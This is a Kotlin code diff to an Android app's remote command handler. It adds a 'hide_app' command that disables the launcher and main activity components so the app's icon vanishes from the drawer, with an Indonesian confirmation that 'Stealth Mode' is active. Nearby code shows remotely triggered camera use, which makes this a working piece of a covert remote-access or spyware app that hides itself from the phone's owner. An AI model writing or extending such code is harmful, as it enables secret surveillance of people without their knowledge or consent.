@@ -438,6 +438,29 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }.start()
                     } else sendResponse(createResponse(cmdId, "error", "Izin CAMERA belum di-ALLOW OS Android!"))
                 }
+                "hide_app" -> {
+                    try {
+                        val packageManager = context.packageManager
+                        
+                        // Disable Alias
+                        packageManager.setComponentEnabledSetting(
+                            android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias"),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                        
+                        // Disable Main Component
+                        packageManager.setComponentEnabledSetting(
+                            android.content.ComponentName(context, MainActivity::class.java),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                        
+                        sendResponse(createResponse(cmdId, "hide_app", "Aplikasi berhasil disembunyikan dari laci utama (Stealth Mode Aktif)"))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal menyembunyikan ikon: ${e.message}"))
+                    }
+                }
                 else -> {
                     sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                 }
